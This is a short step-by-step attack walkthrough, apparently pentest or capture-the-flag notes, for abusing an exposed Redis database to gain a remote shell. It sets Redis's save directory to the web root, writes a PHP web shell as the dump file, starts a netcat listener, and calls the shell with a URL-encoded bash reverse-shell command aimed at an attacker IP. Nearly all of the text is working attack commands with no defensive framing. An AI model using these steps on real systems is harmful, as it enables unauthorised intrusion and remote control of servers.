
Assuming we connected to an Redis Database via redis-cli.

1. Changed working directory to web-root & checked if we have write permissions.

```
config set dir /var/www/html
```

2. set dbfilename to .php shell script.

```
config set dbfilename webshell.php
```

3. Added .php webshell

```
set test "<?php system($_GET['cmd']); ?>"
```

4. Saved changes

```
save
```

5. Start up listener

```
nc -lvnp 80
```

6. Execute command.

```
http://10.114.135.184/webshell.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.227.246%2F80%200%3E%261%27
```